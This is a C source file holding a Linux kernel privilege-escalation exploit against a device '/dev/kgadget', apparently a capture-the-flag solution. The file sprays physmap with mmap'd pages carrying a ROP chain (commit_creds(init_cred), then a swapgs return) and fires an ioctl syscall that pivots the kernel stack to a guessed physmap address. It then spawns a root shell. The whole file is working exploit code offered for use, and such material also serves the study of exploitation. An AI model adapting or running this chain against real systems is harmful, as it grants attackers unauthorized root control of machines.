//
// Created by root on 22-7-7.
//
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>

const size_t commit_creds = 0xFFFFFFFF810C92E0;
const size_t init_cred = 0xFFFFFFFF82A6B700;
const size_t swapgs_restore_regs_and_return_to_usermode = 0xFFFFFFFF81C00FB0 + 0x1B;
const size_t ret = 0xFFFFFFFF810001FC;
const size_t poprdi_ret = 0xffffffff8108c6f0;
const size_t poprsp_ret = 0xffffffff811483d0;
const size_t add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = 0xffffffff810737fe;
long page_size;
size_t* map_spray[16000];
size_t guess;
int dev;

size_t user_cs, user_ss, user_rflags, user_sp;

void save_status();
void print_binary(char*, int);
void info_log(char*);
void error_log(char*);
void getShell();
void makeROP(size_t*);

void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    info_log("Status has been saved.");
}

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length){
    int index = 0;
    char output_buffer[80];
    memset(output_buffer, '\0', 80);
    memset(output_buffer, ' ', 0x10);
    for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
        char temp_buffer[0x10];
        memset(temp_buffer, '\0', 0x10);
        sprintf(temp_buffer, "%#5x", index);
        strcpy(output_buffer, temp_buffer);
        output_buffer[5] = ' ';
        output_buffer[6] = '|';
        output_buffer[7] = ' ';
        for(int j=0; j<16; j++){
            if(index+j >= length)
                sprintf(output_buffer+8+3*j, "   ");
            else{
                sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
                if(!isprint(buf[index+j]))
                    output_buffer[58+j] = '.';
                else
                    output_buffer[58+j] = buf[index+j];
            }
        }
        output_buffer[55] = ' ';
        output_buffer[56] = '|';
        output_buffer[57] = ' ';
        printf("%s\n", output_buffer);
        memset(output_buffer+58, '\0', 16);
        index += 16;
    }
}

void error_log(char* error_info){
    printf("\033[31m\033[1m[x] Fatal Error: %s\033[0m\n", error_info);
    exit(1);
}

void info_log(char* info){
    printf("\033[33m\033[1m[*] Info: %s\033[0m\n", info);
}

void success_log(char* info){
    printf("\033[32m\033[1m[+] Success: %s\033[0m\n", info);
}

void getShell(){
    info_log("Ready to get root......");
    if(getuid()){
        error_log("Failed to get root!");
    }
    success_log("Root got!");
    system("/bin/sh");
}

void makeROP(size_t* space){
    int index = 0;
    for(; index < (page_size / 8 - 0x30); index++)
        space[index] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;
    for(; index < (page_size / 8 - 0x10); index++)
        space[index] = ret;
    space[index++] = poprdi_ret;
    space[index++] = init_cred;
    space[index++] = commit_creds;
    space[index++] = swapgs_restore_regs_and_return_to_usermode;
    space[index++] = 0xdeadbeefdeadbeef;
    space[index++] = 0xdeadbeefdeadbeef;
    space[index++] = (size_t)getShell;
    space[index++] = user_cs;
    space[index++] = user_rflags;
    space[index++] = user_sp;
    space[index] = user_ss;

    info_log("Spray content below:");
    print_binary((char*)space, page_size);
}

int main(){
    save_status();

    dev = open("/dev/kgadget", O_RDWR);
    if(dev < 0)     // failed to open key device, an unexpected error
        error_log("Cannot open device \"/dev/kgadget\"!");

    page_size = sysconf(_SC_PAGESIZE);      // the size of a page, namely 4096 bytes

    info_log("Spraying physmap......");

    map_spray[0] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    makeROP(map_spray[0]);

    for(int i=1; i<15000; i++){
        map_spray[i] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if(!map_spray[i])
            error_log("Mmap Failure!");
        memcpy(map_spray[i], map_spray[0], page_size);
    }

    guess = 0xffff888000000000 + 0x7000000;

    info_log("Ready to turn to kernel......");

    __asm__("mov r15, 0xdeadbeef;"
            "mov r14, 0xcafebabe;"
            "mov r13, 0xdeadbeef;"
            "mov r12, 0xcafebabe;"
            "mov r11, 0xdeadbeef;"
            "mov r10, 0xcafebabe;"
            "mov rbp, 0x12345678;"
            "mov rbx, 0x87654321;"
            "mov r9, poprsp_ret;"
            "mov r8, guess;"
            "mov rax, 0x10;"
            "mov rcx, 0x12345678;"
            "mov rdx, guess;"
            "mov rsi, 0x1bf52;"
            "mov rdi, dev;"
            "syscall;"
            );
    return 0;
}